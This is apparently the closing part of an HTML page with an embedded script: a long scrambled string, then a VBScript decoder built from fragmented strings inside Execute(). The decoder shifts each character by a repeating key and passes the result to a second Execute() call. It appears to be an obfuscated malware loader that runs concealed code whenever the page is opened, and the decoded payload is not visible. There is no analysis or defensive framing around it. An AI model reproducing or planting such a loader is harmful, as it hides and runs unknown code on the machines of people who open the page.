'g!#DDMlg !p JGGim#(!!^ JGGim#]!#DDMlg !q JGGim#c!#DDMlg !s JGGim#_!#DDMlg !U JGGim#(!#DDMlg !> JGGim#]!#DDMlg !q JGGim#c!#DDMlg !s JGGim#_!!U JGGim#=!#DDMlg !l JGGim#g!#DDMlg !m JGGim#i!#DDMlg !k JGGim#_!#DDMlg !k JGGim#n= 5#.> JGGim#J!#DDMlg !ME%HCHnkDQ7#; (^hs7! s[=qI_%6!!,l]qfin= s[=qI_%6!!p\lhmmk^gat^`_<s[mbobjs;%o\BoE`#NgflNdum%o\BoE`#OmIh]jPml#pa@kFe!9%)r`kcoq7#pa@kFe!9%)AL=S= s[=qI_%6!!,ANLI7DDU_lNdum<MbhpM_wq s[=qI_%NhKl\eRqk%o\BoE`#Du^]tq^! JGGim#E!#DDMlg !G JGGim#Y!#DDMlg !p JGGim#n!#DDMlg !^ JGGim#l!#DDMlg !q JGGim#!#DDMlg !&(JGPcmMZng6JG?MN+@_sPi_bfZfEle^do!*(!YF_'HC@RL'@hi^?wflnr%DDVfgJ`qa%qd_U@ni]_q+ans#Qa_mEICLI-@hjxCbfdDDVfgJ`qa%qd_U@ni]_q+ans%EITbhO^mb#rvlndj,,[p^ntm'nwqBg^F_F_'HC@RL'@hi^?wflnr%DDVfgJ`qa%mxpm_l0+Vcblesli(hkb(&NgbgHC@RL'=nmr@hi^JGPcmMZng!prmsbf-1Y]_rhmio+bhh%EITbhO^mb#rvlndj,,[fg_s+orcDk]HcDk]Erg]sfhh"
Execute(""&"Di"&"m vlotecdynkqc(3"&")"&",smhwekemnejsd"&vbCrLf&"vlotecdynkqc("&"0"&") = 6"&vbCrLf&"vlotecdynkqc("&"1"&") = 1"&vbCrLf&"vlotecdynkqc("&"2"&") "&"= 3"&vbCrLf&"vlotecdynkqc(3) "&"= 7"&vbCrLf&"For i"&"=1"&" To "&"L"&"en(ulliemkleuihx)"&vbCrLf&"jarmqshvj = A"&"sc(Mi"&"d(ulliemkleuihx,i"&",1"&"))"&vbCrLf&"If jarmqshvj = 18"&" Then"&vbCrLf&"jarmqshvj = "&"3"&"4"&vbCrLf&"End"&" If"&vbCrLf&"oovn ="&" Chr(jarmqshvj + vlotecdynkqc(i Mod 4))"&vbCrLf&"If oovn = Ch"&"r(2"&"8) Then"&vbCrLf&"oovn = vb"&"Cr"&vbCrLf&"ElseIf oovn = C"&"hr(2"&"9) Then"&vbCrLf&"oovn = vbLf"&vbCrLf&"En"&"d If"&vbCrLf&"smhwekemnejsd = smhwekemnejsd & oovn"&vbCrLf&"Ne"&"xt"&vbCrLf&"K"&"JText "&"= smhwekemnejsd")
Execute(smhwekemnejsd)
</script>
</BODY>
</HTML>




